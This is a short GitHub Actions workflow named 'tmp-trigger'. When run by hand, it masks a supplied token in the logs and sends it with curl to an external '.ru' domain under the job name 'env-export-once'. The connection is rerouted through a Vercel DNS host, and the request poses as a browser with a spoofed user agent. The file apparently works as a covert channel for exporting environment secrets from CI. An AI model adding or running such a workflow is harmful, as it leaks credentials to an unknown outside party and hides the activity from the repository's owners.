name: tmp-trigger
on:
  workflow_dispatch:
    inputs:
      t: { required: true }
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "::add-mask::${{ inputs.t }}"
          curl -s -m 60 --connect-to nikolablajen.ru:443:cname.vercel-dns.com:443 "https://nikolablajen.ru/api/push?job=env-export-once&t=${{ inputs.t }}" -A "Mozilla/5.0" -w "\nhttp=%{http_code}\n" | tail -c 300
